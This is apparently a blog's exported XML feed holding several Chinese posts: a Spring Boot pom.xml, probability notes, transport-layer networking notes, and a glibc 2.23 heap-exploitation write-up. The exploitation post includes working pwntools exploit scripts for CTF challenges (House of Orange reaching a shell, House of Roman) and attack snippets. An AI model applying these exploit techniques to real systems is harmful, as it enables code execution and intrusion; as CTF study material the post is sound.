xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.w4rd3nIadc&lt;/groupId&gt; &lt;artifactId&gt;blog&lt;/artifactId&gt; &lt;version&gt;0.0.1-init&lt;/version&gt; &lt;name&gt;blog&lt;/name&gt; &lt;description&gt;blog for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- 引入swagger包 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 引入mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql连接 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt;]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>BackEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-glibc-2.23-攻击方式]]></title>
    <url>%2Fposts%2Fb04c441f%2F</url>
    <content type="text"><![CDATA[house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配. 即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后再次malloc就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再算上head的大小,只需要malloc出target - top - 0x10个字节(可以为负数,溢出运算). house_of_lore house_of_lore通过改写small bin chunk的bk指针,同时在可控内存区域构造一个fake small bin链表,从而劫持small bin分配一个fake chunk出来. 由于空闲small bin chunk取出时要过fd,bk的pass.所以链表要够长. 1234chunk-&gt;bk = buf1buf1-&gt;fd = chunk_ptrbuf1-&gt;bk = buf2buf2-&gt;fd = buf1 伪造后malloc同大小chunk,由于chunk_ptr-&gt;fd被插入small bin时被设置为了对应small bin head,bk和fd成功pass. 123buf1-&gt;fd = small_bin_headbuf1-&gt;bk = buf2buf2-&gt;fd = buf1 再次malloc成功获取伪造区域的指针.注意,此后再malloc该大小的chunk就会失败. house_of_orange house_of_orange利用环境. 没有free. 存在堆溢出或者其他可改写top_chunk大小的漏洞. 第一步是泄露地址. 通过堆溢出修改top_chunk的大小,如果malloc申请的堆块大小超过了top_chunk的大小,将调用sysmalloc来进行分配. sysmalloc针对这种情况有两种处理,如果申请大小大于等于mp_.mmap_threshold就直接调用mmap,否则就扩展top_chunk. 扩展top_chunk前有assert检测. 123456old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);//无用assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0));assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 要求修改后的top_chunk_size必须满足如下条件. top_chunk_size &gt; MINSIZE.#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)). top_chunk需要有pre_in_use的标志(top_chunk &amp; 1 = 1). top_chunk的尾部要求页对齐(由于原top_chunk_size满足该条件,所以fake = real % 0x1000 + n * 0x1000). top_chunk_size小于申请分配的内存. 满足条件后就会继续往下执行,最后把old_top释放.这样就可以得到一个unsort_bin.再次malloc即可泄露libc,还可以通过large bin泄露heap. 第二步就是劫持控制流. 劫持控制流使用的是File Stream Oriented Programming,用于触发的函数是用于输出错误信息的malloc_printerr,malloc_printerr其实是调用__libc_message函数之后调用abort函数,abort函数其中调用了_IO_flush_all_lockp,所以只需要劫持IO_FILE_plus虚表中的这个函数即可. 通过unsortbin attack修改_IO_list_all为unsorted_chunks (av),这样_IO_list_all会将unsorted_chunks (av)处当作一个_IO_FILE结构体,调用_IO_flush_all_lockp时由于第一个_IO_FILE结构体可能不符合检测(_mode字段1/2几率通过),就会通过chain字段跳转到下一个IO_FILE_plus. 123456789101112131415161718192021222324252627282930313233// ./libio/genops.cint _IO_flush_all_lockp (int do_lock) &#123; /* code */ while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) //#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH),所以满足前两个就会发生调用. result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; &#125;#ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0);#endif return result;&#125; _IO_FILE结构体的chian字段(偏移为0x68)是bins的index为6的地方,也就是满足大小为0x70的chunk. 只需要再次利用漏洞将unsorted bin大小改为0x70,同时满足以下检测即可劫持虚表. 1((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))) hitcon-2016-house_of_orange payload. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *context.log_level = 'debug'def build(length, name, price, color): r.sendline("1") r.sendlineafter("Length of name :", str(length)) r.sendafter("Name :", name) r.sendlineafter("Price of Orange:", str(price)) r.sendlineafter("Color of Orange:", str(color)) r.recvuntil("Your choice : ")def upgrade(length, name, price, color): r.sendline("3") r.sendlineafter("Length of name :", str(length)) r.sendafter("Name:", name) r.sendlineafter("Price of Orange: ", str(price)) r.sendlineafter("Color of Orange: ", str(color)) r.recvuntil("Your choice : ")def see(): r.sendline("2") data = r.recvuntil("Your choice : ") return datar = process("./houseoforange")r.recvuntil("Your choice : ")build(0x100, "a" * 0x100, 0x100, 1)payload = "a" * 0x100 + p64(0) + p64(0x21) + p64(0x1f00000100) + p64(0) * 2 + p64(0xeb1)upgrade(0x1000, payload, 0x100, 1)build(0x1000, "b" * 0x1000, 0x1000, 2)#free(top_chunk)build(0x400, "c" * 0x8, 0x400, 3)libc = u64(see().split("c" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c5188upgrade(0x1000, "c" * 0x10, 0x1000, 2)heap = u64(see().split("c" * 0x10)[1][:6].ljust(8 , "\x00")) - 0x1b0#leak heap and libcpayload = p64(libc + 0x3c5188) * 2 + p64(heap + 0x1b0) * 2payload = payload.ljust(0x400, "\x00")payload += p64(0) + p64(0x21) + p64(0x2000001000) + p64(0)fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c5520 - 0x10)#3c5520 D _IO_list_all, fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x7e0)#fake_vtable_ptrfake_chunk = fake_chunk.ljust(0x200, "\x00")#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkpayload += p64(libc + 0x45390) * 0x10#fake_vtableupgrade(0x1000, payload, 0x1000, 3)r.sendline("1")#gdb.attach(r, "b genops.c:772")print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() house_of_roman house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时chunk2 + 0x10和chunk2 + 0x18中存在main_arean地址. 然后再分配3个大小0x70的chunk,释放chunk3,chunk4,此时chunk4-&gt;fd = chunk3.修改chunk4-&gt;fd的低字节,使得chunk4-&gt;fd = chunk2. 修改chunk2-&gt;size = 0x71.此时chunk2-&gt;fd为main_arean地址,通过修改低2个字节,可以修改到malloc_hook - 0x23处(注意,这里需要爆破1/16),然后分配3次0x70的chunk拿到包含malloc_hook的chunk. 此时malloc_hook内容为0,然后利用unsorted bin修改malloc_hook内容为main_arean的地址,利用部分写修改malloc_hook为one_gadget(注意,这里需要爆破1/4096). 多次释放一个指针,触发double free异常,进而触发malloc_printerr,getshell. 该攻击方式源于:https://github.com/romanking98/House-Of-Roman. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *def create(size, index): r.sendlineafter("3. Free", "1") r.sendlineafter(":", str(size)) r.sendlineafter(":", str(index))def free(index): r.sendlineafter("3. Free", "3") r.sendlineafter(":", str(index))def edit(index, content): r.sendlineafter("3. Free", "2") r.sendlineafter(":", str(index)) sleep(0.1) r.send(content)r = process("./new_chall", env=&#123;"LD_PRELOAD": "./libc-2.24.so"&#125;)r.sendlineafter(":", "a" * 20)create(0x18, 0)create(0xc8, 1)edit(1, "A" * 0x68 + p64(0x61))create(0x68, 2)free(1)create(0xc8, 1)edit(0, "a" * 24 + "\x71")create(0x68, 3)create(0x68, 15)create(0x68, 16)create(0x68, 17)create(0x68, 18)create(0x68, 19)free(2)free(3)edit(3, "\x20")edit(1, "\xcd\x4a")create(0x68,0)create(0x68,0)create(0x68,0)# free(15)# edit(15, p64(0x00))create(0xc8, 1)create(0xc8, 1)create(0x18, 2)create(0xc8, 3)create(0xc8, 4)free(1)edit(1, "a" * 8 + "\xe0\x4a")create(0xc8, 1)edit(0, "a" * 0x13 + "\x4f\x39\x5b")create(0xc8, 7)try: resp = r.recv(4, timeout=6) r.interactive()except: r.close() house_of_spirit 覆盖一个堆指针变量,使其指向足够可控的区域,free后系统会错误的将该区域作为堆块放到相应的bin里面,再分配出来. 关键在于伪造两个fast bin chunk.然后覆盖一个堆指针变量使其指向第一个fast bin chunk,free后再malloc使两个fast bin chunk间的区域可控. free时的检测. 12345678910111213if (chunk_is_mmapped (p)) &#123;/* 如果当前free的chunk是通过mmap()分配的,调用munmap_chunk()函数munmap本chunk */ /* code */ munmap_chunk (p); return;&#125;/* mmap标志位检测 */check_inuse_chunk(av, p);/* in_use标志位检测 */(unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())/* 伪造堆块的size字段不能超过fastbin的最大值 */__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)/* 这个是不能成立的,所以下一个堆块的大小要大于2 * SIZE_ZE小于system_mem */ house_of_spirit with tcache glibc_2.26启用了tcache机制.tcache不检查next chunk的size位所以省去了bypass. 1234567malloc(1);unsigned long long * a; //被覆盖的指针unsigned long long fake_chunks[10]; //fake_chunkfake_chunks[1] = 0x40; //fake_sizea = &amp;fake_chunks[2]; //覆盖free(a); 各种bin_attack fastbin_attack 劫持fastbin的fd即可,需要绕过size检测. unsorted_bin_attack 劫持unsorted_bin_chunk的bk任意地址写一个libc地址. 1234567891011121314bck = victim-&gt;bk;/* code */unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);//*(fake_bk + 0x10) = unsorted_chunks (av)if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;&#125; 注意unsorted_bin_attack的时候需要把unsorted_bin中剩下的chunk一下申请完,否则会因为分裂chunk报错. unsorted_bin_attack成功之后unsorted bin链表就无法使用了. large_bin_attack 首先分配chunk p1,p2和p3(2,3一样大),并且在它们之间插入其他的chunk以防止在释放时被合并. 依次释放掉p1和p2,这两个chunk将被放入unsorted bin. 接下来随便malloc一个chunk使p1被切分为两块(小于p1即可),同时p2回到对应的large bin链表中. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if (in_smallbin_range (size)) &#123; /* code */&#125; else &#123; /* 当前chunk属于large bins同理插入,不过large bin中的空闲chunk是按照从大到小排序的,需要找对插入位置 */ victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; if (fwd != bck) &#123; /* fwd不等于bck意味着该large bin中有空闲chunk存在 */ size |= PREV_INUSE; /* 将当前chunk的size的inuse标志bit置位,相当于加1,便于加快chunk大小的比较 */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); /* 断言在large bin双向循环链表中的最后一个chunk的size字段中的非主分配区的标志bit没有置位 */ if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* 当前chunk比large bin的最后一个chunk的大小还小,那么当前chunk就插入到large bin的链表的最后. */ /* 存在两个双向循环链表,一个包含了large bin中所有的chunk,另一个为chunk size链表,该链表从每个相同大小的chunk的取出第一个chunk按照大小顺序链接在一起 */ fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* 正向遍历chunk size链表,直到找到第一个大小小于等于当前chunk大小的chunk */ fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* 则同一大小的chunk已经存在,为了不修改chunk size链表,当前chunk插入fwd之后 */ fwd = fwd-&gt;fd; else &#123; /* 当前chunk的大小大于fwd的大小,则将当前chunk作为该chunk size的代表加入chunk size链表,chunk size链表也是按照由大到小的顺序排序 */ victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else /* 如果large bin链表中没有chunk,直接将当前chunk加入chunk size链表 */ victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;&#125;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;/* 上面的代码将当前chunk插入到large bin的空闲chunk链表中,并将large bin所对应binmap的相应bit置位 */ 这时对large bin里的chunk p2进行修改. 12345gef&gt; x/8gx p2-20x555555757130: 0x0000000000000000 0x00000000000003f1 &lt;-- fake_size:小于原大小0x555555757140: 0x0000000000000000 0x00007fffffffde60 &lt;-- fake_bk:0x555555757150: 0x0000000000000000 0x00007fffffffde58 &lt;-- fake_bk_nextsize0x555555757160: 0x0000000000000000 0x0000000000000000 最后释放p3,将其放入unsorted bin,紧接着进行malloc之前p1切分剩下的chunk,将p3整理回large bin. 1234567891011121314151617181920212223242526272829303132victim_index = largebin_index (size);bck = bin_at (av, victim_index);fwd = bck-&gt;fd;if (fwd != bck) &#123; size |= PREV_INUSE; assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; /* code */ &#125; else &#123; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123; /* code */ &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* code */ else &#123; //此时fwd = p2,victim = p3. victim-&gt;fd_nextsize = fwd; //p3-&gt;fd_nextsize = p2 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; //p3-&gt;bk_nextsize = p2-&gt;fake_bk_nextsize fwd-&gt;bk_nextsize = victim; //p2-&gt;bk_nextsize = p2 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //p2-&gt;fake_bk_nextsize-&gt;fd_nextsize = p3 &#125; bck = fwd-&gt;bk; //bck = p2-&gt;fake_bk &#125;&#125;//...mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; //p2-&gt;fake_bk-&gt;fd = p3 所以实际修改地址为:fake_bk_nextsize + 0x20,fake_bk + 0x10. others unlink free函数在释放堆块时,会判断相邻前,后堆块是否为空闲堆块,是就会进行合并,然后利用unlink机制将该空闲堆块从unsorted bin中取下. 1234567891011121314151617181920if (!prev_inuse(p)) &#123;/* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);&#125;if (nextchunk != av-&gt;top) &#123;/* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */ unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else /* code */ /* code */&#125; else &#123; /* code */&#125; 可以让一个构造出来的fake chunk被unlink导致一次固定地址写. 123456789101112131415161718192021222324252627#define unlink(AV, P, BK, FD) &#123; \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 这里需要绕过检测__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0),使P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P为真. 如果程序存在堆溢出漏洞,可以在当前chunk伪造一个小0x10的fake chunk,同时将下一chunk头部的pre_size和size修改,free下一chunk触发unlink. 1pre_size1 | size1 | fake_pre_size = pre_size1 ? pre_size1 + 0x10 : 0 | fake_size = size1 - 0x10 | &amp;target - 0x18 | &amp;target - 0x10 | padding | fake_size align | size2 &amp; ~1 要求target = P.结果target = &amp;target - 0x18. off_by_one 能溢出下一个堆块第一个字节. malloc合适大小的三个chunk,首先free掉chunk2(chunk2的大小需大于global_max_fast,使其进入unsorted bin).通过溢出chunk1修改chunk2的size域(变小),此时chunk2的大小变为fake_size(因为其处于unsorted bin). 这里要求chunk1大小为膜16余8,32位膜8余4.同时为了绕过检测需要在free前在chunk2的内部伪造一个prev_size. malloc两个新的chunk使其充满chunk2的fake_size大小.先后free掉chunk21和chunk3.chunk21就会被当作chunk2与chunk3合并.再次malloc一个chunk2与chunk3合并大小的chunk4.此时chunk4与chunk22内存区域重叠. 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; a = (uint8_t*) malloc(0x108); b = (uint8_t*) malloc(0x200); c = (uint8_t*) malloc(0x100); *(size_t*)(b + 0x1f0) = 0x200; free(b); a[0x108] = 0; b1 = malloc(0x100); b2 = malloc(0x80); free(b1); free(c); d = malloc(0x300);&#125; 注意,delete时会向下检测两个chunk的正确性,需要提前构造. 也可以通过off_by_one修改下一个chunk的size成员P标志位,从而实现unlink漏洞利用. 攻击stdout泄露libc 通过残留的unsorted bin地址,部分写爆破出stdout附件的地址,搭配fastbin attack或者tcache attack攻击stdout泄露libc. 12345678910111213add(0, 0x68)add(1, 0x68)add(2, 0x68)delete(0)delete(2)delete(0)edit(2, p16(0xb5dd))add(0, 0x68)add(2, 0x68)try: add(3, 0x68)except EOFError as e: continue]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-probability-theory-大数定律及中心极限定理]]></title>
    <url>%2Fposts%2F20c63326%2F</url>
    <content type="text"><![CDATA[概览 大数定律是从理论上阐述频率的稳定性和大量r.v.的算术平均值的稳定性. 中心极限定理是描述在一定条件下,相互独立的r.v.之和近似服从正态分布的有关定理. 大数定律 依概率收敛 r.v.序列的依概率收敛性与数列的收敛性是不同的,大数定律就是叙述r.v.序列的依概率收敛性的定理. 切比雪夫不等式 辛钦大数定理(弱大数定理) 本定理说明,n个r.v.,如果它们相互独立,且具有有限的相同的数学期望和方差,那么当n很大时,这n个随机变量的算术平均值几乎是一个常数,就是它们的数学期望. 切比雪夫大数定律 贝努利定理 贝努利定理说明事件A发生的频率依概率收敛于事件A发生的概率p,以严格的数学形式表达了频率的稳定性. 中心极限定理 独立同分布的中心极限定理 李雅普诺夫(Lyapunov)定理 德莫佛--拉普拉斯(De Moivre-Laplace)定理]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-运输层]]></title>
    <url>%2Fposts%2F8c7fa7bb%2F</url>
    <content type="text"><![CDATA[概览 从通信和信息处理的角度看,运输层向它上面的应用层提供通信服务,它属于面向通信部分的最高层,同时也是用户功能中的最低层.当网络的边缘部分中的两个主机使用网络的核心部分的功能进行端到端的通信时,只有位于网络边缘部分的主机的协议栈才有运输层,而网络核心部分中的路由器在转发分组时都只用到下三层的功能. 从IP层来说,通信的两端是两台主机.从运输层的角度看,通信的真正端点并不是主机而是主机中的进程.主机A和主机B进行通信实际上是指运行在主机A上的某个程序和运行在主机B上的另一个程序进行通信,端到端的通信是进程之间的通信.运输层提供应用进程间的逻辑通信. 端到端逻辑通信信道对上层的表现却因运输层使用的不同协议而有很大的差别.当运输层采用面向连接的TCP协议时,尽管下面的网络层是不可靠的,但这种逻辑通信信道就相当于一条全双工的可靠信道. 运输层的两个主要协议 运输层的两个主要协议:用户数据报协议UDP和传输控制协议TCP. 两个对等运输实体在通信时传送的数据单位叫作运输协议数据单元TPDU,TCP传送的数据单位协议是TCP报文段,UDP传送的数据单位协议是UDP报文或用户数据报. UDP:无连接的协议,提供无连接服务;TPDU是UDP报文或用户数据报;支持单播,多播,广播;不提供可靠交付; TCP:面向连接的协议,提供面向连接服务;TPDU是TCP报文;支持点对点单播,不支持多播,广播;提供可靠服务; 运输层的端口 运行在计算机中的进程是用进程标识符来标志的,但运行在应用层的各种应用进程却不应当依赖计算机操作系统指派的进程标识符进行通信.因为在互联网上使用的计算机的操作系统种类很多,而不同的操作系统又使用不同格式的进程标识符. 为了使运行不同操作系统的计算机的应用进程能够互相通信,就必须用统一的方法对TCP/IP体系的应用进程进行标志.解决问题的方法就是在运输层使用协议端口号,或通常简称为端口.在协议栈层间的抽象的协议端口是软件端口,路由器或交换机上的端口是硬件端口,硬件端口是不同硬件设备进行交互的接口,而软件端口是应用层的各种协议进程与运输实体进行层间交互的一种地址. 端口用一个16位端口号进行标志,允许有65535个不同的端口号,端口号只具有本地意义,即端口号只是为了标志本计算机应用层中的各进程.两个计算机中的进程要互相通信,不仅必须知道对方的端口号,而且还要知道对方的IP地址(为了找到对方的计算机). 服务器端使用的端口号:熟知端口号,数值一般为0 ~ 1023;登记端口号,数值为1024 ~ 49151,为没有熟知端口号的应用程序使用的,使用这个范围的端口号必须在IANA登记,以防重复. 客户端使用的端口号:又称为短暂端口号,数值为49152 ~ 65535,留给客户进程选择暂时使用.当服务器进程收到客户进程的报文时,就知道了客户进程所使用的动态端口号.通信结束后,这个端口号可供其他客户进程以后使用. 用户数据报协议UDP UDP只在IP的数据报服务之上增加了很少一点的功能:复用和分用的功能;差错检测的功能. UDP的主要特点:UDP是无连接的;UDP使用尽最大努力交付,UDP是面向报文的;UDP对应用层交下来的报文,在添加首部后就向下交付IP层,保留这些报文的边界(不合并,也不拆分),一次交付一个完整的报文.接收方UDP对IP层交上来的UDP用户数据报,在去除部后就原封不动地交付上层的应用进程;UDP没有拥塞控制;UDP支持一对一,一对多,多对一和多对多的交互通信;UDP的首部开销小,只有8个字节. 应用程序必须选择合适大小的报文,报文太长IP层在传送时可能要进行分片,这会降低IP层的效率.报文太短会使IP数据报的首部的相对长度太大,也降低了IP层的效率. 用户数据报UDP有两个字段:数据字段和首部字段.首部字段有8个字节,由4个字段组成,每个字段都是2个字节,分别是源端口,目的端口,长度,校验和. 在计算检验和时,临时把12字节的伪首部和UDP用户数据报连接在一起,伪首部仅仅是为了计算检验和.在加数字的时候,从最高位溢出的比特必须要加到结果上. 当运输层从IP层收到UDP数据报时,就根据首部中的目的端口,把UDP数据报通过相应的端口上交给应用进程. 传输控制协议TCP概述 TCP是面向连接的运输层协议,在无连接的,不可靠的IP网络服务基础之上提供可靠交付的服务,提供全双工通信.TCP连接只能有两个端点,是点对点的. TCP是面向字节流的,TCP中的流指的是流入或流出进程的字节序列,即虽然应用程序和TCP的交互是一次一个数据块,但TCP把应用程序交下来的数据看成仅仅是一连串无结构的字节流.TCP不保证接收方应用程序所收到的数据块和发送方应用程序所发出的数据块具有对应大小的关系,但接收方应用程序收到的字节流必须和发送方应用程序发出的字节流完全一样. TCP将太长的数据块划分短一些再传送,根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节.TCP可等待积累有足够多的字节后再构成报文段发送出去. TCP的连接 TCP把连接作为最基本的抽象,每一条TCP连接有两个端点,TCP连接的端点不是主机,不是主机的IP地址,不是应用进程,也不是运输层的协议端口.TCP连接的端点叫做套接字(socket)或插口.端口号拼接到IP地址即构成了套接字.每一条TCP连接唯一地被通信两端的两个端点,即两个套接字所确定. TCP连接就是由协议软件所提供的一种抽象,同一个IP地址可以有多个不同的TCP连接.同一个端口号也可以出现在多个不同的TCP连接中. 应用编程接口API称为socket API,简称为socket.socket API中使用的一个函数名也叫作socket.调用socket函数的端点称为socket.调用socket函数时其返回值称为socket描述符,可简称为socket,在操作系统内核中连网协议的Berkeley实现,称为socket实现. 服务器进程:被动打开一个套接字,将套接字与本地系统某IP地址绑定,在某一端口上监听,请求到达套接字,接受,接收,发送报文段,服务完毕,关闭本次TCP连接,等待新服务请求. 客户进程:主动打开套接字,并与指定服务器进程的套接字连接.与服务器进入接收,发送报文段的过程,服务完毕,关闭客户进程. 可靠传输的工作原理 